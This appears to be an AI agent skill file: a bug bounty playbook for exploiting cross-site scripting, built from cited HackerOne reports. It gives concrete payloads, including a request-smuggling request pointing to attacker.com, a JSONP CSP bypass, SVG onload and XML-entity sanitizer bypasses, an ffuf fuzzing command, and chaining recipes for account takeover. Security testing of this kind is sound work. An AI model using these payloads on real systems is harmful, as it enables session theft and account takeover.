---
name: xss
description: "Cross-Site Scripting (XSS): DOM-based, stored, and reflected patterns with advanced filter bypasses."
---

# SKILL: Cross-Site Scripting [XSS]

Expert playbook for identifying and exploiting high-payout XSS vulnerabilities, focusing on advanced bypasses, cache poisoning, and complex markdown/diagram integrations based on $10k+ HackerOne reports.

## 1. Core Patterns

### Pattern 1: Cache Poisoning via HTTP Request Smuggling
*   **Architectural Cause:** A "desync" between front-end proxies (e.g., Akamai) and back-end servers (e.g., using `Content-Length` vs `Transfer-Encoding`) allows an attacker to "smuggle" a request that poisons a shared resource or redirect.
*   **H1 Report:** #510152 (PayPal) - **$20,000**
*   **Exact Payload/Endpoint:** 
    `POST /signin HTTP/1.1`
    `Content-Length: 163`
    `Transfer-Encoding: chunked`
    `0`
    `GET /webapps/hermes/api/logger HTTP/1.1`
    `Host: attacker.com`
    *Note: Used to poison critical sign-in JS and bypass CSP via non-CSP endpoints like `/us/gifts`.*

### Pattern 2: Attribute Breakout in Markdown Reference Filters
*   **Architectural Cause:** Overly permissive regex for "valid characters" in reference filters (e.g., `#design/`) allows quotes to break out of HTML attributes during rendering.
*   **H1 Report:** #1212067 (GitLab) - **$16,000**
*   **Exact Payload/Endpoint:** 
    `#/issues/1/designs/bbb"class="gfm"a='.png`
    *Triggered via a malicious filename upload:*
    `Content-Disposition: form-data; name="1"; filename*=ASCII-8BIT''bbb%22class%3D%22gfm%22a%3D%27.png`

### Pattern 3: Language-Specific Attribute Injection in Diagram Renderers
*   **Architectural Cause:** Trusting the `lang` attribute of a parent `<pre>` tag during diagram generation (e.g., Kroki) without proper sanitization before injecting it into an `<img>` tag.
*   **H1 Report:** #1731349 (GitLab) - **$13,950**
*   **Exact Payload/Endpoint:** 
    ```html
    <a><pre lang='f/" onerror=alert(1) onload=alert(1) '><code lang="wavedrom">xss</code></pre></a>
    ```

### Pattern 4: Stored XSS in Feature Autocomplete/Popups
*   **Architectural Cause:** Failing to HTML-escape user-supplied fields (e.g., Name) when they are fetched and rendered in an autocomplete dropdown via an API.
*   **H1 Report:** #1578400 (GitLab) - **$13,950**
*   **Exact Payload/Endpoint:** 
    Endpoint: `/add_contacts` (Quick action autocomplete)
    Payload in contact name: `<script>alert(document.domain)</script>`

### Pattern 5: SVG `data:` to `blob:` URL Origin Inheritance
*   **Architectural Cause:** A rich text editor automatically converts `data:` URLs into `blob:` URLs, which inherit the origin of the hosting page rather than having a unique/restricted origin.
*   **H1 Report:** #1276742 (Shopify) - **$5,300**
*   **Exact Payload/Endpoint:** 
    `<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoZG9jdW1lbnQuZG9tYWluKSI+PC9zdmc+">`

---

## 2. Recon Checklist

*   **JS File Targets:** Monitor `bootstrap.js`, `logger.js`, and any JS files loaded on high-value pages like `/signin` or `/settings`.
*   **Parameter Names:** `filename*`, `lang`, `firstname`, `lastname`, `web_url`.
*   **Hidden Endpoint Discovery:**
    *   Search for API-based autocomplete endpoints (e.g., `/api/v4/projects/:id/members/all`).
    *   Check for third-party integrations: ZenTao (#1542510), Jamf Pro (#1444682), Kroki (#1731349).
*   **Burp Extensions:** 
    *   **HTTP Request Smuggler:** Essential for identifying desyncs leading to cache poisoning.
    *   **Param Miner:** For identifying hidden headers (like `X-Forwarded-Host`) that can be used for cache poisoning.
*   **ID Enumeration Types:** Check if user-supplied metadata is rendered back in internal tools or other users' dashboards.

---

## 3. ID/Target Discovery

*   **API Fuzzing:** Look for endpoints that return JSON data which is then rendered on the frontend. Check if every field in the JSON is properly escaped.
*   **Markdown Parsers:** Test every feature that supports Markdown (Issues, Comments, Wiki, MRs). Use specific syntaxes like `#designs/`, `[link](...)`, or code blocks with custom languages.
*   **File Uploads:** Upload various file types (SVG, HTML, XML) and check how they are served. If served as `image/svg+xml`, try event handlers (`onload`, `onerror`).

---

## 4. Bypass Techniques

1.  **CSP JSONP Bypass:** Use trusted domains in CSP (e.g., `apis.google.com`) to load scripts via JSONP callback (#1212067).
    *   *Example:* `<script src='https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout'></script>`
2.  **Blob URL Pivot:** Use `blob:` URLs to bypass `data:` URL restrictions and inherit the page origin (#1276742).
3.  **XML Entity Bypass:** Use custom XML entities in SVGs to break parsers and bypass whitelists (#232174).
    *   *Example:* `<!DOCTYPE svg [ <!ENTITY elem ""> ]> <svg onload="alert(1)"> &elem; </svg>`
4.  **Attribute Smuggling:** Use double quotes or single quotes to break out of attributes like `href` or `lang` (#1731349).
5.  **Filename Encoding:** Use `filename*` with specific encodings (e.g., `ASCII-8BIT''...`) to bypass server-side filename sanitization (#1212067).
6.  **Integration Schemes:** Use `javascript:` handlers in external integration URLs (e.g., ZenTao `:web_url`) when the origin domain lacks CSP (#1542510).

---

## 5. High-Value Targets

1.  **Authentication/Sign-in Pages:** Bypassing XSS here leads to plaintext password theft (#510152).
2.  **Rich Text Editors (Admin Panels):** Targeting administrators allows for full platform compromise (#1276742).
3.  **Third-Party Integrations:** Integrations like Jamf Pro or ZenTao often have weaker sanitization than the core product (#1444682).
4.  **Markdown Engines:** Complex engines that support custom reference types are highly prone to breakout vulnerabilities (#1212067).

---

## 6. Chaining Playbook

*   **Request Smuggling + Cache Poisoning → Stored XSS:** Smuggle a redirect to a malicious JS file and poison the cache for that file (#488147).
*   **XSS + Content-Disposition Bypass → ATO:** Use XSS to trigger a download of a sensitive file or exfiltrate tokens from a different origin using a CSP bypass.
*   **Google Account Link + XSS → ATO:** Use XSS to capture the state of an OAuth/Google login flow and take over the linked account (#2010530).
*   **Blind XSS + Admin Dashboard → Platform Takeover:** Inject XSS into internal metadata (e.g., Contact Name) and wait for it to fire in an internal admin panel (#1578400).

---

## 7. Variant-Specific: SVG-based XSS

The highest-paying SVG variant is the **Sanitizer "Fail-Open" via XML Entities**.
*   **The Flaw:** When an SVG sanitizer (often based on a regex or simple XML parser) encounters complex XML structures like `<!DOCTYPE>` or internal entities, it may fail to process the rest of the file and "fail open," allowing all attributes (including `onload`) to pass through.
*   **Report:** #232174 - **$5,000**
*   **The Payload:**
    ```xml
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE svg [ <!ENTITY elem ""> ]>
    <svg onload="alert(document.domain);" height="16" width="16">
     &elem;
    </svg>
    ```

---

## 8. Automation

*   **Burp Intruder Pitchfork:** Use this to test multiple fields in an API request simultaneously with XSS payloads.
*   **FFUF Command:**
    ```bash
    ffuf -u https://target.com/API_PATH -X POST -d '{"firstname":"FUZZ", "lastname":"FUZZ"}' -w xss_payloads.txt -mr "alert(1)"
    ```
*   **Response Diffing:** Compare responses for different `Accept` headers or `Content-Type` headers to see if sanitization is skipped for specific formats.

---

## 9. Triage

*   **Verification:** You MUST show the script executing in the victim's session. A simple `alert(1)` is standard, but proving session exfiltration (where possible) is better for Critical severity.
*   **Severity Scoring:**
    *   **Critical ($10k-$20k):** Stored XSS on sign-in pages (#510152), or site-wide ATO risk via strict CSP bypass (#1212067).
    *   **High ($3k-$9k):** Stored XSS in admin-only dashboards or sensitive rich text editors (#1276742).
    *   **Medium ($500-$2k):** Reflected XSS with limited impact or restricted to low-privilege users.

---

## 10. Report Template

### Title: Stored XSS in [COMPONENT] via [TECHNIQUE]

**Summary:**
A stored Cross-Site Scripting (XSS) vulnerability exists in [COMPONENT] due to improper sanitization of [FIELD]. An attacker can inject arbitrary JavaScript that executes in the context of any user viewing the page.

**Description:**
The vulnerability resides in [FILE/ENDPOINT]. Specifically, the [PARAMETER] is rendered without [ENCODING/SANITIZATION]. By [REPRODUCTION STEPS], a script can be persistently stored.

**Payload:**
`[INSERT EXACT PAYLOAD]`

**Steps to Reproduce:**
1. Navigate to [URL].
2. Input the payload in [FIELD].
3. View the page as a victim at [URL].
4. Observe the `alert()` triggering.

**Impact:**
Full account takeover of the victim, theft of session tokens, and unauthorized actions performed in the victim's name.

**Reference:**
Based on patterns observed in HackerOne report #[REPORT_ID].
